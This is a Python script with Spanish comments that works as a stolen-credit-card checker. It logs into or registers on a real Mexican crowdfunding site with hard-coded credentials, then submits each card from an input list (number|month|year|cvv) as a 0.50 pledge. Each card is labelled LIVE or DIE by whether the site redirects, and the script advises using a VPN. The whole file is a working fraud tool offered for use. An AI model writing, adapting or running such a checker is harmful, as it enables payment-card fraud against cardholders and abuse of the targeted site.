#usr/bin/python

#El autor original es Zack Dasti ( Chapuawe )
#El script tiene la licencia GNU Public License v3.0
#Cualquiera puede imitar/modificar este script mientras de creditos al autor

import mechanize
import sys

#cc = sys.argv[1]
#ano = sys.argv[2]
#mes = sys.argv[3]
#cvv = sys.argv[4]

print "\n"
print "                    	Checker Version Beta 0.4.5 \n";

print "	  88   88   .d8b.   NNNNNN  88       	88      88    88";
print "	  88, ,88  d8' '8b    88    88       	88      88,  ,88 ";
print "	  00ooo88  88ooo88    88    88       	88      00oooo88  ";
print "	  88   88  88~~~88    88    88b      	88b     88    88  ";
print "	  88   88  88   88  NNNNNN  88NNNN   	88NNNN  88    88  ";

print "	  ======================================================\n\n";
print "		     Uso: python checker.py archivo.txt\n\n";

br = mechanize.Browser()
response = br.open('https://fondeadora.mx/login.html')

br.select_form(nr=2)

br.form['user[email]'] = 'zackdasti@mail.com'
br.form['user[password]'] = 'joshua75'

br.submit()

if (br.geturl() == "https://fondeadora.mx/login.html"):
	response = br.open('https://fondeadora.mx/registrate.html')
	br.select_form(nr=2)

	br.form['user[name]'] = 'Zack Dasti'
	br.form['user[email]'] = 'zackdasti@mail.com'
	br.set_value('joshua75', nr=5)
	br.set_value('joshua75', nr=6)
	br.submit()

contador = 0
limite = 1

lista = sys.argv[1]
ccs = open(lista ,'r')

try:
	while contador <= limite :

		cc, mes, ano, cvv = ccs.next().rstrip("\n").split("|")

		if (mes == "09"):
			mes = mes.strip("0")

		else:
			pass

		if (mes == "08"):
			mes = mes.strip("0")

		else:
			pass

		if (mes == "07"):
			mes = mes.strip("0")

		else:
			pass

		if (mes == "06"):
			mes = mes.strip("0")

		else:
			pass

		if (mes == "05"):
			mes = mes.strip("0")

		else:
			pass

		if (mes == "04"):
			mes = mes.strip("0")

		else:
			pass

		if (mes == "03"):
			mes = mes.strip("0")

		else:
			pass

		if (mes == "02"):
			mes = mes.strip("0")

		else:
			pass

		if (mes == "01"):
			mes = mes.strip("0")

		else:
			pass

		response = br.open('https://fondeadora.mx/projects/animalpolitico/backers/new?reward=0&backing_amount=0.50&continue=Continuar')
		urlchecker = 'https://fondeadora.mx/projects/animalpolitico/backers/new?reward=0&backing_amount=0.50&continue=Continuar'
		urlpass = br.geturl()

		br.select_form(nr=2)

		br.form['date[year]'] = [ano]
		br.form['date[month]'] = [mes]

		br.set_value('Zack Dasti', nr=3)
		br.set_value(cc, nr=2)
		br.set_value(cvv, nr=6)

		br.submit()

		if (urlpass != urlchecker):
			print "  LIVE  " + cc + "\n"

		else :
			print "  DIE  " + cc + "\n"

		contador = contador + 1
		limite = limite + 1

except:

	print "  El Checker Ha Terminado :) \n  Si Tuviste Algun Error Recuerda Usar VPN"

exit()

#Saludos a todo el chat de administracion de chats de lhg 
#Saludos a el chat # 1 y el chat #5 de lhg
# Y por ultimo saludos a mi bb Andrew Gonzales :3 <3cd